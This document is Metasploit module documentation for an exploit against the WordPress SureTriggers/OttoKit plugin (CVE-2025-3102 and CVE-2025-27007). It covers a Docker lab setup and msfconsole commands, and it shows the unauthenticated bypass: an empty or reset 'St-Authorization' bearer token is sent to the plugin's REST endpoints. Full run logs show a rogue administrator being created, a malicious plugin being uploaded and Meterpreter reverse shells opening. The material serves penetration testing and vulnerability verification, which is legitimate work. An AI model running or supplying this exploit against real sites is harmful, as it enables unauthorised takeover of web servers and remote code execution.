## Vulnerable Application

This Metasploit module exploits administrative user creation vulnerabilities in the
WordPress SureTriggers/OttoKit plugin:

* **CVE-2025-3102** (≤ 1.0.78): unauthenticated admin creation via the `automation/action`
REST endpoint with an empty `St-Authorization: Bearer ` header.
* **CVE-2025-27007** (≤ 1.0.82): unauthenticated reset of the access key via the `connection/create-wp-connection` endpoint,
followed by admin creation using `St-Authorization: Bearer <NEW_KEY>`.

### To replicate vulnerable environments

1. **SureTriggers v1.0.78 (CVE-2025-3102)**

   * Download & install plugin v1.0.78:
     `https://downloads.wordpress.org/plugin/suretriggers.1.0.78.zip`
   * No additional setup is required; the bypass works immediately upon activation.

2. **SureTriggers v1.0.82 (CVE-2025-27007)**

   * Download & install plugin v1.0.82:
     `https://downloads.wordpress.org/plugin/suretriggers.1.0.82.zip`
   * No secret key is needed; the exploit will reset it to the specified value.

Both scenarios can be deployed via Docker Compose.

## Docker Compose Configuration

```yaml
services:

  wordpress:
    image: wordpress:6.3.2
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    volumes:
      - wordpress:/var/www/html
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_ROOT_PASSWORD: dummy_password
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

Create a `custom.ini` file with:

```ini
upload_max_filesize = 64M
post_max_size = 64M
```

## Verification Steps

1. Start the environment:

```bash
docker-compose up -d
```
2. Complete WordPress setup at [http://localhost:5555](http://localhost:5555).
3. Confirm the targeted SureTriggers version is active under **Plugins**.
4. In `msfconsole`:

```bash
use exploit/multi/http/wp_suretriggers_auth_bypass
set RHOSTS 127.0.0.1
set TARGETURI /
set WP_USER eviladmin
set WP_PASS Str0ngP@ss!
set WP_EMAIL eviladmin@example.com
```

## Options

* **WP_USER**, **WP_PASS**, **WP_EMAIL**: New administrator credentials (random by default).
* **ST_AUTH**: *(Optional)* Value for `St-Authorization` header (used by CVE-2025-3102; default empty).
* **ACCESS_KEY**: *(Optional)* Key to reset for CVE-2025-27007 (random by default).
* **ACTION**: Exploit to perform:

  * `CVE-2025-3102`
  * `CVE-2025-27007`

## Scenarios

### CVE-2025-3102: Empty Bearer Admin Creation

1. Ensure SureTriggers v1.0.78 is active.
2. In `msfconsole`, set:

```bash
set ACTION CVE-2025-3102
```
3. Run the module: it will send an empty `St-Authorization: Bearer ` header to `/wp-json/sure-triggers/v1/automation/action`.
4. New administrator is created; payload is uploaded and executed.

### CVE-2025-27007: Reset Access Key & Admin Creation

1. Ensure SureTriggers v1.0.82 is active.
2. In `msfconsole`, set:

```bash
set ACTION CVE-2025-27007
```
3. Run the module: it will call `/wp-json/sure-triggers/v1/connection/create-wp-connection` to reset the key, then use
   `St-Authorization: Bearer mynewkey123` against `/wp-json/sure-triggers/v1/automation/action`.
4. New administrator is created; payload is uploaded and executed.


### Expected Results (CVE-2025-3102)

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers version 1.0.78 (vulnerable to CVE-2025-3102)
[*] CVE-2025-3102: creating admin via St-Authorization Bearer (empty)
[+] Admin created: zGrsYO:8XL0pZKjN7pc
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_63rkh/ajax_fybgc.php...
[*] Sending stage (40004 bytes) to 172.27.0.3
[+] Deleted ajax_fybgc.php
[+] Deleted wp_63rkh.php
[+] Deleted ../wp_63rkh
[*] Meterpreter session 1 opened (192.168.1.36:4444 -> 172.27.0.3:51410) at 2025-05-14 19:00:30 +0200

meterpreter > sysinfo
Computer    : 396e678f2510
OS          : Linux 396e678f2510 6.14.2-2-cachyos #1 SMP PREEMPT_DYNAMIC Thu, 10 Apr 2025 17:27:10 +0000 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set target 1
target => 1
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers version 1.0.78 (vulnerable to CVE-2025-3102)
[*] CVE-2025-3102: creating admin via St-Authorization Bearer (empty)
[+] Admin created: zGrsYO:8XL0pZKjN7pc
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_exf15/ajax_tpfd9.php...
[*] Sending stage (3045380 bytes) to 172.27.0.3
[+] Deleted ajax_tpfd9.php
[+] Deleted wp_exf15.php
[+] Deleted ../wp_exf15
[*] Meterpreter session 2 opened (192.168.1.36:4444 -> 172.27.0.3:53324) at 2025-05-14 19:02:06 +0200

meterpreter > sysinfo
Computer     : 172.27.0.3
OS           : Debian 12.10 (Linux 6.14.2-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### Expected Results (CVE-2025-27007)

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set action CVE-2025-27007
action => CVE-2025-27007
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers version 1.0.82 (vulnerable to CVE-2025-27007)
[*] CVE-2025-27007: reset access key & create admin
[*] Resetting access key
[+] Access key reset successful
[+] Admin created: pAEaR3:98TCYzILsdXt
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_14slj/ajax_drh8b.php...
[*] Sending stage (40004 bytes) to 172.27.0.3
[+] Deleted ajax_drh8b.php
[+] Deleted wp_14slj.php
[+] Deleted ../wp_14slj
[*] Meterpreter session 1 opened (192.168.1.36:4444 -> 172.27.0.3:42464) at 2025-05-14 19:05:06 +0200

meterpreter > sysinfo
Computer    : 396e678f2510
OS          : Linux 396e678f2510 6.14.2-2-cachyos #1 SMP PREEMPT_DYNAMIC Thu, 10 Apr 2025 17:27:10 +0000 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set target 1
target => 1
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_suretriggers_auth_bypass) > run http://lab:5555
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected WordPress version: 6.8.1
[+] The target appears to be vulnerable. Detected suretriggers version 1.0.82 (vulnerable to CVE-2025-27007)
[*] CVE-2025-27007: reset access key & create admin
[*] Resetting access key
[+] Access key reset successful
[+] Admin created: pAEaR3:98TCYzILsdXt
[*] Uploading malicious plugin for code execution...
[*] Executing payload at /wp-content/plugins/wp_c7ziw/ajax_a9arm.php...
[*] Sending stage (3045380 bytes) to 172.27.0.3
[+] Deleted ajax_a9arm.php
[+] Deleted wp_c7ziw.php
[+] Deleted ../wp_c7ziw
[*] Meterpreter session 2 opened (192.168.1.36:4444 -> 172.27.0.3:54362) at 2025-05-14 19:06:04 +0200

meterpreter > sysinfo
Computer     : 172.27.0.3
OS           : Debian 12.10 (Linux 6.14.2-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
